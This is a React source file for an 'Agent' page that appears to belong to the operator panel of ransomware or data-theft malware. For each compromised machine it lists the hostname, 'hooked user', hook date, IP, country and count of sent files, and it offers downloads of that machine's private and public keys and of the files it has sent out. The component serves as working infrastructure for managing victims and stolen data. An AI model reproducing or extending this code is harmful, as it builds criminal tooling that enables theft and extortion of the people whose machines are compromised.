import { useParams } from "react-router-dom";
import { getFetch } from '../utils/functions';
import { useState, useEffect } from 'react';
import { useNavigate } from "react-router-dom";
import Button from 'react-bootstrap/Button';
import { Download } from "react-bootstrap-icons";
import { saveAs } from "file-saver";
import { SERVER_PORT, SERVER_IP } from '../utils/config';
import Session from 'react-session-api'
Session.config(true, 60)

const Agent = () => {

    const [agentID, setAgentID] = useState("");
    const [hostname, setHostname] = useState("");
    const [os, setOs] = useState("");
    const [ip, setIp] = useState("");
    const [hookUser, setHookUser] = useState("");
    const [hookDate, setHookDate] = useState("");
    const [country, setCountry] = useState("");
    const [totalFilesSend, setTotalFilesSend] = useState("");
    const [totalFilesSize, setTotalFilesSize] = useState("");
    const [privateKey, setPrivateKey] = useState("");
    const [publicKey, setPublicKey] = useState("");
    const [agentFiles, setAgentFiles] = useState([]);


    let { agentid } = useParams();

    const [inputText, setInputText] = useState("");
    let inputHandler = (e) => {
        //convert input text to lower case
        var lowerCase = e.target.value.toLowerCase();
        setInputText(lowerCase);
    };

    const exportUserInfo = (key, fileName) => {
        const blob = new Blob([key], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const link = document.createElement("a");
        link.download = fileName;
        link.href = url;
        link.click();
    }

    const humanFileSize = (size) => {
        var i = size == 0 ? 0 : Math.floor(Math.log(size) / Math.log(1024));
        return (size / Math.pow(1024, i)).toFixed(2) * 1 + ' ' + ['B', 'kB', 'MB', 'GB', 'TB'][i];
    }

    const getUserInfo = async () => {
        const agentInfo = await getFetch({ reqUsername: Session.get("username"), reqToken: Session.get("token"), agentID: agentid }, "/getAgentInfo")
        setAgentID(agentInfo.data.agent.agentID)
        setHostname(agentInfo.data.agent.host)
        setOs(agentInfo.data.agent.versionOS)
        setIp(agentInfo.data.agent.ip)
        setHookUser(agentInfo.data.agent.hookUser)
        setHookDate(agentInfo.data.agent.hookDate)
        setCountry(agentInfo.data.agent.country)
        setTotalFilesSend(agentInfo.data.agent.totalFilesSend)
        setTotalFilesSize(humanFileSize(agentInfo.data.agent.totalFilesSize))
        setPrivateKey(agentInfo.data.agent.privKey)
        setPublicKey(agentInfo.data.agent.pubKey)
    }

    const getFilesInfo = async () => {
        const allFiles = await getFetch({ username: Session.get("username"), token: Session.get("token"), agentID: agentid }, "/getAgentFiles")
        setAgentFiles(allFiles.data.files)
    }

    const downloadFile = async (file) => {
        saveAs(
            "http://" + SERVER_IP + ":" + SERVER_PORT + "/download?file=" + file + "&agentID=" + agentid,
            file
        )
    }

    let navigate = useNavigate();

    useEffect(() => {

        if (Session.get("username") == undefined || Session.get("token") == undefined) {
            return navigate("/login");
        }

        getUserInfo()
        getFilesInfo()
    }, []);

    return (
        <div className="container-fluid">
            <h3 className="text-dark mb-4">Agent ID: {agentID}</h3>
            <div className="row mb-3">
                <div className="col-lg-8 col-xl-12">
                    <div className="row">
                        <div className="col">
                            <div className="card shadow mb-5">
                                <div className="card-header py-3">
                                    <p className="text-primary m-0 fw-bold">Host information&nbsp;</p>
                                </div>
                                <div className="card-body">
                                    <form>
                                        <div className="row">
                                            <div className="col">
                                                <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Hostname</strong></label>
                                                    <p>{hostname}</p>
                                                </div>
                                            </div>
                                            <div className="col">
                                                <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Hooked User&nbsp;&nbsp;</strong></label>
                                                    <p>{hookUser}</p>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="row">
                                            <div className="col">
                                                <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Operating System</strong></label>
                                                    <p>{os}</p>
                                                </div>
                                            </div>
                                            <div className="col">
                                                <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Hook Date</strong></label>
                                                    <p>{hookDate}<br /></p>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="row">
                                            <div className="col">
                                                <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Public IP</strong></label>
                                                    <p>{ip}</p>
                                                </div>
                                            </div>
                                            <div className="col">
                                                <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Country</strong></label>
                                                    <p>{country}<br /></p>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="row">
                                            <div className="col">
                                                <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Total Files</strong></label>
                                                    <p>{totalFilesSend}</p>
                                                </div>
                                            </div>
                                            <div className="col">
                                                <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Total File Size</strong></label>
                                                    <p>{totalFilesSize}<br /></p>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="mb-3">
                                            <Button onClick={() => exportUserInfo(publicKey, "public_key.pem")} variant="light">
                                                Public Key
                                            </Button>
                                            <Button onClick={() => exportUserInfo(privateKey, "private_key.pem")} variant="warning">
                                                Private Key
                                            </Button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
                <div className="col-lg-8 col-xl-12">
                    <div className="card shadow">
                        <div className="card-header py-3">

                            <p className="text-primary m-0 fw-bold">Files</p>
                        </div>
                        <div className="card-body">
                            <div className="row">
                                <div className="col-md-6 text-nowrap">
                                    <div
                                        id="dataTable_length"
                                        className="dataTables_length"
                                        aria-controls="dataTable"
                                    ></div>
                                </div>
                                <div className="col-md-6">
                                    <div
                                        className="text-md-end dataTables_filter"
                                        id="dataTable_filter"
                                    >
                                        <label className="form-label">
                                            <input
                                                type="search"
                                                className="form-control form-control-sm"
                                                aria-controls="dataTable"
                                                onChange={inputHandler}
                                                placeholder="Search"
                                            />
                                        </label>
                                    </div>
                                </div>
                            </div>
                            <div
                                className="table-responsive table mt-2"
                                id="dataTable"
                                role="grid"
                                aria-describedby="dataTable_info"
                            >
                                <table className="table my-0" id="dataTable">
                                    <thead>
                                        <tr>
                                            <th>File</th>
                                            <th>Size</th>
                                            <th className="text-center">Download</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {
                                            agentFiles.filter(file => {
                                                if (inputText === '') {
                                                    return file;
                                                } else if (file.name.toLowerCase().includes(inputText)) {
                                                    return file;
                                                }
                                            }).map((file, i) => (
                                                <tr key={i}>
                                                    <td>{file.name}</td>
                                                    <td>{humanFileSize(file.fileSizeInBytes)}</td>
                                                    <td className="text-center">
                                                        <Download onClick={() => {downloadFile(file.name)}} />
                                                    </td>
                                                </tr>
                                            ))}
                                    </tbody>
                                    <tfoot>
                                        <tr></tr>
                                    </tfoot>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="w-100"></div>
            </div>
        </div>
    )
}
export default Agent;